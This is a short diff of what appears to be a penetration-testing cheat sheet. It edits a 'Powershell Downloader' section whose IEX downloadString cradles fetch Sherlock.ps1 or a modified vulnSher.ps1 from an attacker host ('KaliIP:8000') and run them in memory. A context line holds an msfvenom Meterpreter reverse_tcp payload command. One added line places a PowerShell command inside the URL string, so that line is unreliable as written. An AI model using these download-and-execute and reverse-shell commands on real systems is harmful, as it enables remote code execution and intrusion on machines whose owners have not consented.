@@ -812,8 +812,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Y
 ```
 ## Powershell Downloader
 ```
-IEX(New-Object Net.WebClient).downloadString('http://KaliIP:8000/Sherlock.ps1')
-or vulnSher.ps1
+IEX(New-Object Net.WebClient).downloadString('http://KaliIP:8000/Sherlock.ps1; Find-AllVulns')
+or modded script
+IEX(New-Object Net.WebClient).downloadString('http://KaliIP:8000/vulnSher.ps1')
 ```
 ## WGET vbs (copy and paste into shell)
 ```
